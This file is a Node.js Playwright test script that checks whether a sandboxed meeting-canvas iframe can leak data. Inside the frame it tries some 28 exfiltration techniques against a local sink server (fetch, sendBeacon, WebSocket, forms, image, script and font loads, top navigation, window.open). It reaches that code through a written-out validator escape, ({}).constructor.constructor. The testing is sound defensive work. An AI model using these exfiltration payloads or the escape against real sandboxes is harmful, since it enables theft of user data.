#!/usr/bin/env node
/**
 * canvas-isolation — the Meeting Canvas frame's way-out proof, in a real browser.
 *
 *   NODE_PATH=<dir>/node_modules node scripts/canvas-isolation.mjs \
 *     --terminal http://terminal.localhost:3954 \
 *     [--proxy 3954=3950 --proxy 3955=3951] [--domain localhost] [--resolve 127.0.0.1] [--page /mdx-demo] [--json out.json]
 *
 * It opens a terminal page, mounts the canvas frame exactly as `canvas/runtime.tsx` does (the URL
 * the page names in `<meta name="vexa-canvas-origin">`, else `/canvas-frame` on the page's own
 * origin; `sandbox="allow-scripts"`, no referrer), posts a view and a meeting whose title is a
 * unique marker, and lets the view try to carry that marker out:
 *   its own frame navigated to the terminal, to its own origin and to another host (location, a
 *   link, a meta refresh); the top page navigated; window.open; a form submitted (GET and POST);
 *   fetch, a beacon and a WebSocket; a picture, a script, a stylesheet, a font, a prefetch and a
 *   worker. Every way is tried against the terminal's origin and against a sink on another host.
 *
 * A way out FAILS when the marker reached a server that took it: the sink saw it, or a request
 * carrying it was answered by anything but the terminal's front door refusing it (a response
 * carrying `x-vexa-refused`, api/frameDoor.mjs). With `--proxy listen=upstream` the probe stands a recording proxy in
 * front of each terminal port, so what reached the server is read on the server side as well as
 * from the browser. The positive control: a view that only renders the meeting shows its title in
 * the frame and reports `ok` to the page.
 *
 * The terminal, the canvas host and the sink are distinct origins on one machine: `*.localhost` by
 * default, which a browser resolves to loopback and treats as a secure context (so it sends the
 * `Sec-Fetch-*` headers the terminal's door reads, as it does over HTTPS). `--domain <d>` uses
 * `*.<d>` instead, mapped to `--resolve <address>` — a plain-HTTP host that is NOT a secure context,
 * where the browser sends no `Sec-Fetch-*` at all. It needs Playwright
 * (Apache-2.0), which is NOT a dependency of the terminal: run it where Playwright is installed
 * (bbb), with `NODE_PATH` pointing at that install, or `PLAYWRIGHT_CHROMIUM` naming a binary.
 * Exit 1 when any way out delivered the marker or the control did not render.
 */
import { createServer, request as httpRequest } from "node:http";
import { writeFileSync } from "node:fs";
import { createRequire } from "node:module";

// require, not import(): NODE_PATH reaches CommonJS resolution only.
const require = createRequire(import.meta.url);
let chromium;
for (const name of ["playwright-core", "playwright"]) {
  try { ({ chromium } = require(name)); break; } catch { /* the next */ }
}
if (!chromium) { console.error("Playwright is not installed here. Run this where it is (set NODE_PATH), see the header."); process.exit(2); }

function args(argv) {
  const out = { proxy: [], page: "/mdx-demo", resolve: "127.0.0.1", domain: "localhost" };
  for (let i = 0; i < argv.length; i++) {
    const a = argv[i];
    const v = argv[i + 1];
    if (a === "--terminal") { out.terminal = v; i++; }
    else if (a === "--proxy") { out.proxy.push(v); i++; }
    else if (a === "--resolve") { out.resolve = v; i++; }
    else if (a === "--domain") { out.domain = v; i++; }
    else if (a === "--page") { out.page = v; i++; }
    else if (a === "--json") { out.json = v; i++; }
  }
  if (!out.terminal) throw new Error("--terminal <url> is required");
  return out;
}

const opts = args(process.argv.slice(2));
const TERMINAL = new URL(opts.terminal).origin;
const MARK = "leak";

// ── the server side: a recording proxy in front of each terminal port, and the sink ─────────────
const served = []; // every request a terminal port received: { port, host, url, status, refused }
function frontProxy(listen, upstream) {
  return new Promise((resolve) => {
    const srv = createServer((req, res) => {
      const up = httpRequest({ host: "127.0.0.1", port: upstream, method: req.method, path: req.url, headers: req.headers }, (r) => {
        served.push({ port: listen, host: req.headers.host, url: req.url, method: req.method,
          dest: req.headers["sec-fetch-dest"], site: req.headers["sec-fetch-site"],
          status: r.statusCode, refused: r.headers["x-vexa-refused"] ?? null });
        res.writeHead(r.statusCode, r.headers);
        r.pipe(res);
      });
      up.on("error", () => { res.writeHead(502); res.end(); });
      req.pipe(up);
    });
    srv.on("upgrade", (req, socket) => {
      served.push({ port: listen, host: req.headers.host, url: req.url, method: "UPGRADE", status: null, refused: "probe-proxy" });
      socket.destroy();
    });
    srv.listen(listen, "127.0.0.1", () => resolve(srv));
  });
}

const sinkHits = [];
const sink = createServer((req, res) => {
  let body = "";
  req.on("data", (c) => { body += c; });
  req.on("end", () => {
    sinkHits.push({ url: req.url, method: req.method, body });
    res.writeHead(200, { "content-type": "text/plain", "access-control-allow-origin": "*" });
    res.end("ok");
  });
});
sink.on("upgrade", (req, socket) => { sinkHits.push({ url: req.url, method: "UPGRADE", body: "" }); socket.destroy(); });
await new Promise((r) => sink.listen(0, "127.0.0.1", r));
const SINK = `http://sink.${opts.domain}:${sink.address().port}`;

const proxies = [];
for (const p of opts.proxy) {
  const [listen, upstream] = p.split("=").map(Number);
  proxies.push(await frontProxy(listen, upstream));
}

// ── the views ─────────────────────────────────────────────────────────────────────────────────
// Each body runs inside the view with `d` = the marker, through the escape the validator cannot see
// (`({}).constructor.constructor`), so it is ordinary script in the frame's realm.
const nav = (url) => `location.href = ${url};`;
const WAYS = [
  ["frame → terminal API (location)", (T) => nav(`${T} + "/api/version?${MARK}=" + d`)],
  ["frame → terminal page (location)", (T) => nav(`${T} + "/?${MARK}=" + d`)],
  ["frame → terminal API (link click)", (T) => `var a = document.createElement("a"); a.href = ${T} + "/api/version?${MARK}=" + d; document.body.appendChild(a); a.click();`],
  ["frame → terminal live view path (location)", (T) => nav(`${T} + "/api/bot-accounts/sessions/${"0".repeat(32)}/view/vnc.html?${MARK}=" + d`)],
  ["frame → terminal (meta refresh)", (T) => `var m = document.createElement("meta"); m.httpEquiv = "refresh"; m.content = "0;url=" + ${T} + "/?${MARK}=" + d; document.head.appendChild(m);`],
  ["frame → its own origin (location)", () => nav(`"/canvas-frame?${MARK}=" + d`)],
  ["frame → its own origin, any path (location)", () => nav(`"/${MARK}/" + d`)],
  ["frame → sink (location)", (T, S) => nav(`${S} + "/?${MARK}=" + d`)],
  ["top → sink", (T, S) => `top.location.href = ${S} + "/?${MARK}=" + d;`],
  ["top → terminal", (T) => `top.location.href = ${T} + "/?${MARK}=" + d;`],
  ["window.open → sink", (T, S) => `window.open(${S} + "/?${MARK}=" + d);`],
  ["window.open → terminal", (T) => `window.open(${T} + "/api/version?${MARK}=" + d);`],
  ["link target=_blank → sink", (T, S) => `var a = document.createElement("a"); a.target = "_blank"; a.href = ${S} + "/?${MARK}=" + d; document.body.appendChild(a); a.click();`],
  ["form GET → sink", (T, S) => `var f = document.createElement("form"); f.method = "GET"; f.action = ${S} + "/"; var i = document.createElement("input"); i.name = "${MARK}"; i.value = d; f.appendChild(i); document.body.appendChild(f); f.submit();`],
  ["form POST → terminal", (T) => `var f = document.createElement("form"); f.method = "POST"; f.action = ${T} + "/api/version?${MARK}=" + d; var i = document.createElement("input"); i.name = "${MARK}"; i.value = d; f.appendChild(i); document.body.appendChild(f); f.submit();`],
  ["fetch → sink", (T, S) => `fetch(${S} + "/?${MARK}=" + d).catch(function(){});`],
  ["fetch → terminal", (T) => `fetch(${T} + "/api/version?${MARK}=" + d, { mode: "no-cors" }).catch(function(){});`],
  ["sendBeacon → sink", (T, S) => `try { navigator.sendBeacon(${S} + "/?${MARK}=" + d, d); } catch (e) {}`],
  ["WebSocket → sink", (T, S) => `try { new WebSocket(${S}.replace("http", "ws") + "/?${MARK}=" + d); } catch (e) {}`],
  ["image → sink", (T, S) => `new Image().src = ${S} + "/?${MARK}=" + d;`],
  ["script → sink", (T, S) => `var s = document.createElement("script"); s.src = ${S} + "/x.js?${MARK}=" + d; document.head.appendChild(s);`],
  ["script → terminal", (T) => `var s = document.createElement("script"); s.src = ${T} + "/api/version?${MARK}=" + d; document.head.appendChild(s);`],
  ["script → its own origin", () => `var s = document.createElement("script"); s.src = "/api/version?${MARK}=" + d; document.head.appendChild(s);`],
  ["stylesheet → sink", (T, S) => `var l = document.createElement("link"); l.rel = "stylesheet"; l.href = ${S} + "/x.css?${MARK}=" + d; document.head.appendChild(l);`],
  ["stylesheet → its own origin", () => `var l = document.createElement("link"); l.rel = "stylesheet"; l.href = "/api/version?${MARK}=" + d; document.head.appendChild(l);`],
  ["font → its own origin", () => `var st = document.createElement("style"); st.textContent = "@font-face{font-family:p;src:url(/api/version?${MARK}=" + d + ")} body{font-family:p}"; document.head.appendChild(st); document.body.appendChild(document.createTextNode("x"));`],
  ["prefetch → sink", (T, S) => `var l = document.createElement("link"); l.rel = "prefetch"; l.href = ${S} + "/?${MARK}=" + d; document.head.appendChild(l);`],
  ["worker → sink", (T, S) => `try { new Worker(${S} + "/w.js?${MARK}=" + d); } catch (e) {}`],
];

function viewSource(body) {
  return `export default function View() {
  const m = useMeeting();
  useEffect(() => { ({}).constructor.constructor("d", ${JSON.stringify(body)})(m.meeting.title); }, []);
  return React.createElement(ui.Empty, { title: "probe", body: "probe" });
}`;
}
const CONTROL = `export default function View() {
  const m = useMeeting();
  return React.createElement(ui.Empty, { title: "Meeting: " + m.meeting.title, body: "control" });
}`;

function meeting(title) {
  return {
    meeting: { id: "probe", title },
    transcript: { segments: [] },
    entities: { people: [], companies: [], products: [], numbers: [] },
    cards: [], metrics: {}, sections: {},
  };
}

// ── the browser ───────────────────────────────────────────────────────────────────────────────
const launch = { headless: true, args: opts.domain === "localhost" ? [] : [`--host-resolver-rules=MAP *.${opts.domain} ${opts.resolve}`] };
if (process.env.PLAYWRIGHT_CHROMIUM) launch.executablePath = process.env.PLAYWRIGHT_CHROMIUM;
const browser = await chromium.launch(launch);
const context = await browser.newContext();
const seen = []; // every browser request carrying a marker: { url, status, refused, failure }
context.on("request", (r) => { if (r.url().includes(MARK)) seen.push({ req: r, url: r.url(), status: null, refused: null, failure: null }); });
context.on("response", (resp) => {
  const e = seen.find((s) => s.req === resp.request());
  if (e) { e.status = resp.status(); e.refused = resp.headers()["x-vexa-refused"] ?? null; }
});
context.on("requestfailed", (r) => { const e = seen.find((s) => s.req === r); if (e) e.failure = r.failure()?.errorText ?? "failed"; });

const page = await context.newPage();
const violations = [];
page.on("console", (m) => { if (/Content.Security.Policy|Refused|Blocked/i.test(m.text())) violations.push(m.text().slice(0, 300)); });
const landing = await page.goto(`${TERMINAL}${opts.page}`, { waitUntil: "networkidle" });
const policy = (await page.evaluate(() => document.querySelector('meta[name="vexa-canvas-origin"]')?.getAttribute("content") ?? "")) || "";
const frameUrl = `${policy || TERMINAL}/canvas-frame`;
const CANVAS = new URL(frameUrl).origin;
const pageCsp = (landing ? (await landing.allHeaders())["content-security-policy"] : "") ?? "";

/** Mount one frame as the runtime does, post `source` + a meeting titled `title`, and wait. */
async function mount(source, title, wait = 2500) {
  const id = `f${Math.random().toString(36).slice(2)}`;
  await page.evaluate(({ id, frameUrl, source, state }) => {
    const w = window;
    w.__probe = w.__probe || {};
    const log = (w.__probe[id] = { messages: [], loads: 0 });
    const f = document.createElement("iframe");
    f.id = id;
    f.setAttribute("sandbox", "allow-scripts");
    f.setAttribute("referrerpolicy", "no-referrer");
    f.src = frameUrl;
    f.onload = () => { log.loads += 1; };
    window.addEventListener("message", (e) => {
      if (e.source !== f.contentWindow) return;
      log.messages.push({ origin: e.origin, data: e.data });
      if (e.data && e.data.type === "vexa-canvas:ready") f.contentWindow.postMessage({ type: "vexa-canvas:render", source, state, theme: "dark" }, "*");
    });
    document.body.appendChild(f);
  }, { id, frameUrl, source, state: meeting(title) });
  await page.waitForTimeout(wait);
  const log = await page.evaluate((id) => window.__probe[id], id);
  const handle = await page.$(`#${id}`);
  const content = handle ? await handle.contentFrame() : null;
  let text = null;
  try { text = content ? await content.evaluate(() => document.body?.innerText ?? "") : null; } catch { text = null; }
  return { log, text };
}

const results = [];
let n = 0;
for (const [name, body] of WAYS) {
  n += 1;
  const marker = `${MARK}${n}x${Math.random().toString(36).slice(2, 8)}`;
  const before = { sink: sinkHits.length, seen: seen.length, served: served.length };
  await mount(viewSource(body(JSON.stringify(TERMINAL), JSON.stringify(SINK))), marker);
  const atSink = sinkHits.slice(before.sink).filter((h) => (h.url + h.body).includes(marker));
  const inBrowser = seen.slice(before.seen).filter((s) => s.url.includes(marker))
    .map(({ url, status, refused, failure }) => ({ url, status, refused, failure }));
  const atServer = served.slice(before.served).filter((s) => s.url.includes(marker));
  const taken = [...new Set([
    ...atSink.map((h) => `sink ${h.method} ${h.url}`),
    ...inBrowser.filter((s) => s.status !== null && !s.refused).map((s) => `${s.status} ${s.url}`),
    ...atServer.filter((s) => !s.refused).map((s) => `server ${s.status} ${s.host}${s.url}`),
  ])];
  const how = taken.length ? "DELIVERED"
    : inBrowser.some((s) => s.refused) || atServer.some((s) => s.refused) ? "refused at the server's door"
    : inBrowser.length ? `blocked in the browser (${[...new Set(inBrowser.map((s) => s.failure ?? "no response"))].join(", ")})`
    : "never left the frame";
  results.push({ way: name, marker, verdict: taken.length ? "FAIL" : "pass", how, taken, inBrowser, atServer, atSink });
  console.log(`${taken.length ? "✗" : "✓"} ${name.padEnd(46)} ${how}${taken.length ? `: ${taken.join(" | ")}` : ""}`);
}

// the positive control: the view renders the meeting, and the page hears `ok`
const title = `Probe meeting ${Math.random().toString(36).slice(2, 8)}`;
const control = await mount(CONTROL, title, 3000);
const ok = control.log.messages.some((m) => m.data?.type === "vexa-canvas:status" && m.data.ok === true);
const shown = (control.text ?? "").includes(`Meeting: ${title}`);
const origins = [...new Set(control.log.messages.map((m) => m.origin))];
console.log(`${ok && shown ? "✓" : "✗"} control: view rendered the meeting (${shown}), page heard ok (${ok}), from origin(s) ${origins.join(", ")}`);
if (!(ok && shown)) console.log(JSON.stringify(control.log.messages).slice(0, 2000));

const failed = results.filter((r) => r.verdict === "FAIL");
const summary = {
  terminal: TERMINAL, canvas: CANVAS, frameUrl, sink: SINK, pageFrameSrc: (pageCsp.match(/frame-src[^;]*/) ?? [""])[0],
  userAgent: await page.evaluate(() => navigator.userAgent),
  ways: results.length, delivered: failed.length, control: { rendered: shown, ok, origins },
  results, violations: violations.slice(0, 200),
};
console.log(`\n${results.length - failed.length}/${results.length} ways out held · control ${ok && shown ? "rendered" : "DID NOT render"} · canvas ${CANVAS} · page ${summary.pageFrameSrc}`);
if (opts.json) writeFileSync(opts.json, JSON.stringify(summary, null, 2));

await browser.close();
sink.close();
for (const p of proxies) p.close();
process.exit(failed.length || !(ok && shown) ? 1 : 0);
